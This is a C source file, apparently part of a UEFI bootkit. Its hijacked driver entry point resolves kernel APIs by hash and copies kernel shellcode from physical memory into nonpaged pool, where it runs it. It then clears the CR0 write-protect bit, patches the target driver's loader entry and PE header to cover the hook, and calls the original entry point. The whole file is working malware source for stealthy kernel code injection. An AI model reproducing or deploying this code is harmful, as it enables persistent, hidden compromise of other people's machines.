#include "Common.h"

VOID
NTAPI
KeSetSystemAffinityThread(
	_In_ SIZE_T Affinity
);

PVOID
NTAPI
ExAllocatePool(
	_In_ SIZE_T PoolType,
	_In_ SIZE_T NumberOfBytes
);

VOID
NTAPI
MmUnmapIoSpace(
	_In_ LPVOID BaseAddress,
	_In_ SIZE_T NumberOfBytes
);

PVOID
NTAPI
MmMapIoSpace(
	_In_ LPVOID PhysicalAddress,
	_In_ SIZE_T NumberOfBytes,
	_In_ SIZE_T CacheType
);

typedef struct
{
	D_API( KeSetSystemAffinityThread );
	D_API( ExAllocatePool );
	D_API( MmUnmapIoSpace );
	D_API( MmMapIoSpace );
} API ;

/* API Hashes */
#define H_API_KESETSYSTEMAFFINITYTHREAD		0x80679c78 /* KeSetSystemAffinityThread */
#define H_API_EXALLOCATEPOOL			0xa1fe8ce1 /* ExAllocatePool */
#define H_API_MMUNMAPIOSPACE			0xf2610ec4 /* MmUnmapIoSpace */
#define H_API_MMMAPIOSPACE			0x7fbf0801 /* MmMapIoSpace */

/*!
 *
 * Purpose:
 *
 * Copies over a larger kernel shellcode and injects
 * it into the host memory.
 *
!*/
D_SEC( G ) NTSTATUS NTAPI DrvMain( _In_ PVOID DriverObject, _In_ PVOID RegistryPath )
{
	API			Api;

	ULONG			Ofs = 0;

	PVOID			Fcn = NULL;
	PVOID			Phy = NULL;
	PEFTBL			Eft = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;
	PIMAGE_SECTION_HEADER	Sec = NULL;
	PLDR_DATA_TABLE_ENTRY	Ldr = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* Get efi table */
	Eft = C_PTR( G_PTR( EfTbl ) );
	Dos = C_PTR( U_PTR( Eft->TgtDrvImgBase ) );
	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
	Ldr = C_PTR( U_PTR( Eft->TgtDrvLdrEntry ) );
	Sec = C_PTR( U_PTR( Eft->TgtDrvImgSect ) );

	/* Get functions */
	Api.KeSetSystemAffinityThread = PeGetFuncEat( Eft->KernelBase, H_API_KESETSYSTEMAFFINITYTHREAD );
	Api.ExAllocatePool            = PeGetFuncEat( Eft->KernelBase, H_API_EXALLOCATEPOOL );
	Api.MmUnmapIoSpace            = PeGetFuncEat( Eft->KernelBase, H_API_MMUNMAPIOSPACE );
	Api.MmMapIoSpace              = PeGetFuncEat( Eft->KernelBase, H_API_MMMAPIOSPACE );

	/* Map the physical memory */
	if ( ( Phy = Api.MmMapIoSpace( Eft->KernelBuf, Eft->KernelLen, 0 ) ) != NULL ) {
		/* Allocate a nonpaged pool to execute over */
		if ( ( Fcn = Api.ExAllocatePool( 0 /* NonPaged */, Eft->KernelLen ) ) != NULL ) {

			/* Copy over the buffer */
			__builtin_memcpy( Fcn, Phy, Eft->KernelLen );

			/* Get KernelMain() addr */
			Ofs = U_PTR( G_PTR( KmEnt ) ) - U_PTR( G_PTR( EfiMain ) );
			Fcn = C_PTR( U_PTR( Fcn ) + Ofs );

			/* Execute KernelMain( KernelBase ); */
			( ( VOID NTAPI ( * )( PVOID, PVOID ) ) Fcn )( Eft->KernelBase, Eft->TgtDrvImgBase );
		};
		/* Unmap the memory */
		Api.MmUnmapIoSpace( Phy, Eft->KernelLen );
	};

	/* Force to 1 CPU */
	Api.KeSetSystemAffinityThread( 1 );

	/* Remove write protection */
	__writecr0( __readcr0() &~ 0x000010000 );

	/* Fix the section permissions */
	Sec->Characteristics &= IMAGE_SCN_MEM_EXECUTE;

	/* Fix the entrypoint */
	Ldr->EntryPoint = C_PTR( U_PTR( Dos ) + U_PTR( Eft->TgtDrvAddressOfEntrypoint ) );

	/* Fix the image header */
	Nth->OptionalHeader.AddressOfEntryPoint = Eft->TgtDrvAddressOfEntrypoint;

	/* Insert write protection */
	__writecr0( __readcr0() | 0x000010000 );

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* Execute original driver entrypoint */
	return ( ( __typeof__( DrvMain ) * ) C_PTR( U_PTR( Eft->TgtDrvImgBase ) + Eft->TgtDrvAddressOfEntrypoint ) )(
			DriverObject, RegistryPath
	);
};
